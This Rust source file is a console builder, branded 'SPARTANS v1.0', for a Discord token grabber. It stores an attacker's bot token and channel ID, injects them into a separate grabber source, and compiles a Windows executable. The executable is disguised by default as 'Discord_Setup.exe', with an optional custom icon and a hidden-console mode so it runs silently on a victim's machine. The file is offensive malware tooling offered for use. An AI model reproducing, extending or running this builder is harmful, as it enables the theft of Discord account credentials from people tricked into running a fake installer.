use std::io::{self, Write};
use std::fs;
use std::process::Command;
use std::path::Path;

struct CompileSettings {
    window_mode: String,
    output_name: String,
    icon_path: Option<String>,
}

impl CompileSettings {
    fn new() -> Self {
        CompileSettings {
            window_mode: String::from("visible"),
            output_name: String::from("Discord_Setup"),
            icon_path: None,
        }
    }

    fn show_status(&self) {
        println!("{}", center_text(""));
        println!("{}", center_text("Current settings:"));
        println!("{}", center_text(&format!("Window Mode: {}", self.window_mode.to_uppercase())));
        println!("{}", center_text(&format!("Output Name: {}.exe", self.output_name)));
        if let Some(icon) = &self.icon_path {
            println!("{}", center_text(&format!("Icon: {}", icon)));
        } else {
            println!("{}", center_text("Icon: None"));
        }
    }
}

fn clear_screen() {
    Command::new("cmd")
        .args(&["/c", "cls"])
        .status()
        .ok();
}

fn set_red_color() {
    print!("\x1b[38;5;124m");
    io::stdout().flush().ok();
}

fn center_text(text: &str) -> String {
    let width = 80;
    let text_len = text.chars().count();
    if text_len >= width {
        return text.to_string();
    }
    let padding = (width - text_len) / 2;
    format!("{}{}", " ".repeat(padding), text)
}

fn show_main_menu() {
    clear_screen();
    set_red_color();
    
    println!("\n\n\n");
    println!("{}", center_text("╔════════════════════════════════════════════════╗"));
    println!("{}", center_text("║              SPARTANS v1.0                     ║"));
    println!("{}", center_text("╚════════════════════════════════════════════════╝"));
    println!("\n\n");
    println!("{}", center_text("[1] Configure Discord Bot"));
    println!("{}", center_text("[2] Compile Archive"));
    println!("{}", center_text("[0] Exit"));
    println!("\n\n");
    print!("{}", center_text("Select option: "));
    io::stdout().flush().unwrap();
}

fn main() {
    let mut settings = CompileSettings::new();
    
    loop {
        show_main_menu();
        
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => config_bot_menu(),
            "2" => compile_menu(&mut settings),
            "0" => break,
            _ => {}
        }
    }
}

fn config_bot_menu() {
    loop {
        clear_screen();
        set_red_color();
        
        println!("\n\n\n");
        println!("{}", center_text("╔════════════════════════════════════════════════╗"));
        println!("{}", center_text("║         DISCORD BOT CONFIGURATION              ║"));
        println!("{}", center_text("╚════════════════════════════════════════════════╝"));
        println!("\n");
        
        println!("{}", center_text("────────────────────────────────────────────────"));
        if let Ok(cfg) = fs::read_to_string("config.txt") {
            let lines: Vec<&str> = cfg.lines().collect();
            if lines.len() >= 2 {
                let token_preview = if lines[0].len() > 40 {
                    format!("{}...", &lines[0][..40])
                } else {
                    lines[0].to_string()
                };
                println!("{}", center_text(&format!("Bot Token: {}", token_preview)));
                println!("{}", center_text(&format!("Channel ID: {}", lines[1])));
            } else {
                println!("{}", center_text("No configuration found"));
            }
        } else {
            println!("{}", center_text("No configuration found"));
        }
        println!("{}", center_text("────────────────────────────────────────────────"));
        println!("\n\n");
        
        println!("{}", center_text("[1] Copy Bot Token / Channel ID"));
        println!("{}", center_text("[2] Paste Bot Token / Channel ID"));
        println!("{}", center_text("[3] Delete Bot Token / Channel ID"));
        println!("{}", center_text("[0] Back to Main Menu"));
        println!("\n\n");
        print!("{}", center_text("Select option: "));
        io::stdout().flush().unwrap();
        
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => copy_bot_config(),
            "2" => paste_bot_config(),
            "3" => delete_bot_config(),
            "0" => break,
            _ => {}
        }
    }
}

fn copy_bot_config() {
    clear_screen();
    set_red_color();
    
    println!("\n\n\n");
    println!("{}", center_text("╔════════════════════════════════════════════════╗"));
    println!("{}", center_text("║           COPY BOT CONFIGURATION               ║"));
    println!("{}", center_text("╚════════════════════════════════════════════════╝"));
    println!("\n\n");
    
    if !Path::new("config.txt").exists() {
        println!("{}", center_text("No configuration found"));
        println!("{}", center_text("Please paste a configuration first (option 2)"));
        println!("\n\n");
        pause();
        return;
    }
    
    match fs::read_to_string("config.txt") {
        Ok(content) => {
            let ps_cmd = format!(
                "Set-Clipboard -Value '{}'",
                content.replace("'", "''")
            );
            
            let result = Command::new("powershell")
                .args(&["-Command", &ps_cmd])
                .status();
            
            match result {
                Ok(status) if status.success() => {
                    println!("{}", center_text("Configuration copied to clipboard!"));
                    println!("\n\n");
                    println!("{}", center_text("You can now paste it anywhere:"));
                    println!("{}", center_text("• Notepad"));
                    println!("{}", center_text("• Discord DM"));
                    println!("{}", center_text("• Another computer"));
                }
                _ => {
                    println!("{}", center_text("Failed to copy to clipboard"));
                    println!("\n\n");
                    println!("{}", center_text("Manual copy:"));
                    println!("{}", center_text("────────────────────────────────────────────────"));
                    for line in content.lines() {
                        println!("{}", center_text(line));
                    }
                    println!("{}", center_text("────────────────────────────────────────────────"));
                }
            }
        }
        Err(_) => {
            println!("{}", center_text("Failed to read configuration"));
        }
    }
    
    println!("\n\n");
    pause();
}

fn paste_bot_config() {
    clear_screen();
    set_red_color();
    
    println!("\n\n\n");
    println!("{}", center_text("╔════════════════════════════════════════════════╗"));
    println!("{}", center_text("║          PASTE BOT CONFIGURATION               ║"));
    println!("{}", center_text("╚════════════════════════════════════════════════╝"));
    println!("\n\n");
    
    println!("{}", center_text("Paste your Bot Token and Channel ID"));
    println!("{}", center_text("Format: Token on line 1, Channel ID on line 2"));
    println!("\n\n");
    
    print!("{}Bot Token: ", " ".repeat(28));
    io::stdout().flush().unwrap();
    let mut token = String::new();
    io::stdin().read_line(&mut token).unwrap();
    
    if token.trim().is_empty() {
        println!("\n{}", center_text("Cancelled"));
        println!("\n\n");
        pause();
        return;
    }
    
    print!("{}Channel ID: ", " ".repeat(27));
    io::stdout().flush().unwrap();
    let mut channel = String::new();
    io::stdin().read_line(&mut channel).unwrap();
    
    if channel.trim().is_empty() {
        println!("\n{}", center_text("Cancelled"));
        println!("\n\n");
        pause();
        return;
    }
    
    let cfg = format!("{}\n{}", token.trim(), channel.trim());
    match fs::write("config.txt", cfg) {
        Ok(_) => {
            println!("\n{}", center_text("Configuration saved successfully!"));
            println!("\n\n");
            println!("{}", center_text(&format!("Token: {}...", &token.trim()[..30.min(token.trim().len())])));
            println!("{}", center_text(&format!("Channel: {}", channel.trim())));
        }
        Err(_) => {
            println!("\n{}", center_text("Failed to save configuration"));
        }
    }
    
    println!("\n\n");
    pause();
}

fn delete_bot_config() {
    clear_screen();
    set_red_color();
    
    println!("\n\n\n");
    println!("{}", center_text("╔════════════════════════════════════════════════╗"));
    println!("{}", center_text("║         DELETE BOT CONFIGURATION               ║"));
    println!("{}", center_text("╚════════════════════════════════════════════════╝"));
    println!("\n\n");
    
    if !Path::new("config.txt").exists() {
        println!("{}", center_text("No configuration found"));
        println!("\n\n");
        pause();
        return;
    }
    
    println!("{}", center_text("Are you sure you want to delete?"));
    println!("{}", center_text("This action cannot be undone!"));
    println!("\n\n");
    println!("{}", center_text("[Y] Yes, delete it"));
    println!("{}", center_text("[N] No, go back"));
    println!("\n\n");
    print!("{}", center_text("Choice: "));
    io::stdout().flush().unwrap();
    
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    
    if input.trim().eq_ignore_ascii_case("y") {
        match fs::remove_file("config.txt") {
            Ok(_) => {
                println!("\n{}", center_text("Configuration deleted"));
            }
            Err(_) => {
                println!("\n{}", center_text("Failed to delete"));
            }
        }
    } else {
        println!("\n{}", center_text("Cancelled"));
    }
    
    println!("\n\n");
    pause();
}

fn compile_menu(settings: &mut CompileSettings) {
    loop {
        clear_screen();
        set_red_color();
        
        println!("\n\n\n");
        println!("{}", center_text("╔════════════════════════════════════════════════╗"));
        println!("{}", center_text("║              COMPILE ARCHIVE                   ║"));
        println!("{}", center_text("╚════════════════════════════════════════════════╝"));
        println!("\n\n");
        println!("{}", center_text("[1] Compile Token Grabber"));
        println!("{}", center_text("[2] Compile Custom Archive"));
        println!("{}", center_text("[0] Back to Main Menu"));
        println!("\n\n");
        print!("{}", center_text("Select option: "));
        io::stdout().flush().unwrap();
        
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => compile_grabber_menu(settings),
            "2" => compile_custom(),
            "0" => break,
            _ => {}
        }
    }
}

fn compile_grabber_menu(settings: &mut CompileSettings) {
    loop {
        clear_screen();
        set_red_color();
        
        println!("\n\n\n");
        println!("{}", center_text("╔════════════════════════════════════════════════╗"));
        println!("{}", center_text("║          COMPILE TOKEN GRABBER                 ║"));
        println!("{}", center_text("╚════════════════════════════════════════════════╝"));
        
        settings.show_status();
        
        println!("\n\n");
        println!("{}", center_text("Configuration:"));
        println!("{}", center_text("[1] Window Mode (Show/Hide console)"));
        println!("{}", center_text("[2] Output Name"));
        println!("{}", center_text("[3] Icon File"));
        println!("{}", center_text("[4] Start Compilation"));
        println!("{}", center_text("[0] Back"));
        println!("\n\n");
        print!("{}", center_text("Select option: "));
        io::stdout().flush().unwrap();
        
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => configure_window_mode(settings),
            "2" => configure_output_name(settings),
            "3" => configure_icon(settings),
            "4" => {
                compile_token_grabber(settings);
                break;
            }
            "0" => break,
            _ => {}
        }
    }
}

fn configure_window_mode(settings: &mut CompileSettings) {
    clear_screen();
    set_red_color();
    
    println!("\n\n\n");
    println!("{}", center_text("╔════════════════════════════════════════════════╗"));
    println!("{}", center_text("║               WINDOW MODE                      ║"));
    println!("{}", center_text("╚════════════════════════════════════════════════╝"));
    println!("\n\n");
    println!("{}", center_text("Choose window mode:"));
    println!("\n\n");
    println!("{}", center_text("[1] Visible (Show console window)"));
    println!("{}", center_text("[2] Hidden (Run silently)"));
    println!("\n\n");
    print!("{}", center_text("Select option: "));
    io::stdout().flush().unwrap();
    
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    
    match input.trim() {
        "1" => {
            settings.window_mode = String::from("visible");
            println!("\n{}", center_text("Set to: VISIBLE"));
        }
        "2" => {
            settings.window_mode = String::from("hidden");
            println!("\n{}", center_text("Set to: HIDDEN"));
        }
        _ => {
            println!("\n{}", center_text("Invalid option"));
        }
    }
    
    println!("\n\n");
    pause();
}

fn configure_output_name(settings: &mut CompileSettings) {
    clear_screen();
    set_red_color();
    
    println!("\n\n\n");
    println!("{}", center_text("╔════════════════════════════════════════════════╗"));
    println!("{}", center_text("║               OUTPUT NAME                      ║"));
    println!("{}", center_text("╚════════════════════════════════════════════════╝"));
    println!("\n\n");
    println!("{}", center_text(&format!("Current: {}.exe", settings.output_name)));
    println!("\n\n");
    print!("{}New name (without .exe): ", " ".repeat(23));
    io::stdout().flush().unwrap();
    
    let mut name = String::new();
    io::stdin().read_line(&mut name).unwrap();
    let name = name.trim();
    
    if !name.is_empty() {
        let name = if name.ends_with(".exe") {
            &name[..name.len()-4]
        } else {
            name
        };
        settings.output_name = String::from(name);
        println!("\n{}", center_text(&format!("Output name set to: {}.exe", name)));
    } else {
        println!("\n{}", center_text("Name not changed"));
    }
    
    println!("\n\n");
    pause();
}

fn configure_icon(settings: &mut CompileSettings) {
    clear_screen();
    set_red_color();
    
    println!("\n\n\n");
    println!("{}", center_text("╔════════════════════════════════════════════════╗"));
    println!("{}", center_text("║                ICON FILE                       ║"));
    println!("{}", center_text("╚════════════════════════════════════════════════╝"));
    println!("\n\n");
    
    if let Some(icon) = &settings.icon_path {
        println!("{}", center_text(&format!("Current: {}", icon)));
    } else {
        println!("{}", center_text("No icon selected"));
    }
    
    println!("\n\n");
    println!("{}", center_text("Enter icon path (or leave empty for no icon):"));
    println!("\n\n");
    print!("{}Path: ", " ".repeat(35));
    io::stdout().flush().unwrap();
    
    let mut path = String::new();
    io::stdin().read_line(&mut path).unwrap();
    let path = path.trim().trim_matches('"');
    
    if !path.is_empty() {
        if !Path::new(path).exists() {
            println!("\n{}", center_text("File not found"));
        } else if !path.to_lowercase().ends_with(".ico") {
            println!("\n{}", center_text("File must be .ico format"));
        } else {
            settings.icon_path = Some(String::from(path));
            println!("\n{}", center_text("Icon set"));
        }
    } else {
        settings.icon_path = None;
        println!("\n{}", center_text("Icon removed"));
    }
    
    println!("\n\n");
    pause();
}

fn compile_token_grabber(settings: &CompileSettings) {
    clear_screen();
    set_red_color();
    
    println!("\n\n\n");
    println!("{}", center_text("╔════════════════════════════════════════════════╗"));
    println!("{}", center_text("║         COMPILING TOKEN GRABBER                ║"));
    println!("{}", center_text("╚════════════════════════════════════════════════╝"));
    println!("\n\n");
    
    if !Path::new("config.txt").exists() {
        println!("{}", center_text("Bot not configured"));
        println!("{}", center_text("Configure it first (Option 1)"));
        println!("\n\n");
        pause();
        return;
    }
    
    let grabber_src = Path::new("utilitys/token-grabber/main.rs");
    if !grabber_src.exists() {
        println!("{}", center_text("Grabber source not found"));
        println!("{}", center_text("Expected: utilitys/token-grabber/main.rs"));
        println!("\n\n");
        pause();
        return;
    }
    
    println!("{}", center_text("Configuration:"));
    settings.show_status();
    println!("\n\n");
    println!("{}", center_text("Starting compilation..."));
    println!("\n\n");
    
    let cfg = match fs::read_to_string("config.txt") {
        Ok(c) => c,
        Err(_) => {
            println!("{}", center_text("Cannot read config"));
            println!("\n\n");
            pause();
            return;
        }
    };
    
    let lines: Vec<&str> = cfg.lines().collect();
    if lines.len() < 2 {
        println!("{}", center_text("Invalid config"));
        println!("\n\n");
        pause();
        return;
    }
    
    let bot_token = lines[0].trim();
    let channel_id = lines[1].trim();
    
    println!("{}", center_text("[1/4] Reading grabber source..."));
    
    let grabber_code = match fs::read_to_string(grabber_src) {
        Ok(code) => code,
        Err(_) => {
            println!("{}", center_text("Cannot read grabber source"));
            println!("\n\n");
            pause();
            return;
        }
    };
    
    let modified_code = grabber_code
        .replace("YOUR_BOT_TOKEN_HERE", bot_token)
        .replace("YOUR_CHANNEL_ID_HERE", channel_id);
    
    println!("{}", center_text("[2/4] Creating temporary project..."));
    
    let _ = fs::remove_dir_all("grabber_tmp");
    fs::create_dir_all("grabber_tmp/src").ok();
    
    fs::write("grabber_tmp/src/main.rs", modified_code).ok();
    
    let cargo_toml = r#"[package]
name = "discord-grabber"
version = "1.0.0"
edition = "2021"

[profile.release]
opt-level = "z"
lto = true
strip = true
codegen-units = 1
panic = "abort"

[dependencies]
"#;
    
    fs::write("grabber_tmp/Cargo.toml", cargo_toml).ok();
    
    println!("{}", center_text("[3/4] Compiling... (30-90 seconds)"));
    println!("{}", center_text("Please wait..."));
    println!("\n\n");
    
    let mut cmd = Command::new("cargo");
    cmd.current_dir("grabber_tmp")
        .arg("build")
        .arg("--release")
        .arg("--target")
        .arg("x86_64-pc-windows-gnu");
    
    if settings.window_mode == "hidden" {
        fs::create_dir_all("grabber_tmp/.cargo").ok();
        let cargo_config = r#"[target.x86_64-pc-windows-gnu]
rustflags = ["-C", "link-args=-Wl,--subsystem,windows"]
"#;
        fs::write("grabber_tmp/.cargo/config.toml", cargo_config).ok();
    }
    
    let output = cmd.output();
    
    match output {
        Ok(o) if o.status.success() => {
            println!("{}", center_text("[4/4] Copying to SPARTANS folder..."));
            
            let exe_path = Path::new("grabber_tmp/target/x86_64-pc-windows-gnu/release/discord-grabber.exe");
            
            if exe_path.exists() {
                let output_filename = format!("{}.exe", settings.output_name);
                let output_path = Path::new(&output_filename);
                
                if fs::copy(exe_path, &output_path).is_ok() {
                    println!("\n\n");
                    println!("{}", center_text("════════════════════════════════════════════════"));
                    println!("{}", center_text("                SUCCESS!"));
                    println!("{}", center_text("════════════════════════════════════════════════"));
                    println!("\n\n");
                    println!("{}", center_text(&format!("File: {}.exe", settings.output_name)));
                    
                    if let Ok(metadata) = fs::metadata(&output_path) {
                        let size_mb = metadata.len() as f64 / 1024.0 / 1024.0;
                        println!("{}", center_text(&format!("Size: {:.2} MB", size_mb)));
                    }
                    
                    println!("{}", center_text("Location: SPARTANS folder"));
                    println!("\n\n");
                    
                    if settings.window_mode == "hidden" {
                        println!("{}", center_text("Window mode: HIDDEN"));
                        println!("{}", center_text("Console will NOT be visible when run"));
                    } else {
                        println!("{}", center_text("Window mode: VISIBLE"));
                        println!("{}", center_text("Console will be visible when run"));
                    }
                    
                    println!("\n\n");
                    println!("{}", center_text("Bot configured:"));
                    println!("{}", center_text(&format!("Token: {}...", &bot_token[..30.min(bot_token.len())])));
                    println!("{}", center_text(&format!("Channel: {}", channel_id)));
                } else {
                    println!("\n{}", center_text("Failed to copy to SPARTANS folder"));
                }
            } else {
                println!("\n{}", center_text("EXE not found after compilation"));
            }
        }
        Ok(_) => {
            println!("\n{}", center_text("Compilation failed"));
            println!("\n\n");
            println!("{}", center_text("Make sure:"));
            println!("{}", center_text("1. Rust is installed: cargo --version"));
            println!("{}", center_text("2. Target: rustup target add x86_64-pc-windows-gnu"));
        }
        Err(e) => {
            println!("\n{}", center_text(&format!("Cannot run cargo: {}", e)));
            println!("{}", center_text("Make sure Rust is installed properly"));
        }
    }
    
    println!("\n\n");
    println!("{}", center_text("Cleaning up..."));
    let _ = fs::remove_dir_all("grabber_tmp");
    println!("{}", center_text("Cleanup complete"));
    println!("\n\n");
    
    pause();
}

fn compile_custom() {
    clear_screen();
    set_red_color();
    
    println!("\n\n\n");
    println!("{}", center_text("╔════════════════════════════════════════════════╗"));
    println!("{}", center_text("║          COMPILE CUSTOM ARCHIVE                ║"));
    println!("{}", center_text("╚════════════════════════════════════════════════╝"));
    println!("\n\n");
    println!("{}", center_text("This feature allows you to compile custom Rust projects."));
    println!("\n\n");
    println!("{}", center_text("Enter path to your main.rs file:"));
    println!("\n\n");
    print!("{}Path: ", " ".repeat(35));
    io::stdout().flush().unwrap();
    
    let mut path = String::new();
    io::stdin().read_line(&mut path).unwrap();
    let path = path.trim().trim_matches('"');
    
    if path.is_empty() {
        println!("\n{}", center_text("Cancelled"));
        println!("\n\n");
        pause();
        return;
    }
    
    if !Path::new(path).exists() {
        println!("\n{}", center_text(&format!("File not found: {}", path)));
        println!("\n\n");
        pause();
        return;
    }
    
    println!("\n{}", center_text("Feature under development"));
    println!("{}", center_text("For now, use the Token Grabber compiler (Option 2-1)"));
    println!("\n\n");
    pause();
}

fn pause() {
    print!("\n{}Press Enter to continue...", " ".repeat(24));
    io::stdout().flush().unwrap();
    let mut buffer = String::new();
    io::stdin().read_line(&mut buffer).ok();
}
